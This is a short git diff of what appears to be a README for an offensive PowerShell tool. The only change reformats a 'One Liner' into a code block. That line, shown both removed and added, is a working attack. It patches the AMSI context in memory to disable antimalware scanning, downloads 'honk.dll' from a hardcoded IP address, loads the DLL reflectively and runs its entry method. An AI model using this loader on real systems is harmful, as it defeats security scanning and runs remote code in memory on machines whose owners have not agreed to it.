@@ -51,7 +51,9 @@ try{
 ```
 
 One Liner:
-`try{[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|%{($c=$_).GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|%{$g=$_.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}; $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.233.137/honk.dll'); $assem=[System.Reflection.Assembly]::Load($data); [honk.Program]::appleBits()}catch{Write-Error "An error occurred: $_"}finally{Write-Host "Press Enter to exit...";[Console]::ReadLine()}`
+```powershell
+try{[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|%{($c=$_).GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|%{$g=$_.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)}}; $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.233.137/honk.dll'); $assem=[System.Reflection.Assembly]::Load($data); [honk.Program]::appleBits()}catch{Write-Error "An error occurred: $_"}finally{Write-Host "Press Enter to exit...";[Console]::ReadLine()}
+```
 
 ## Disclaimer
 
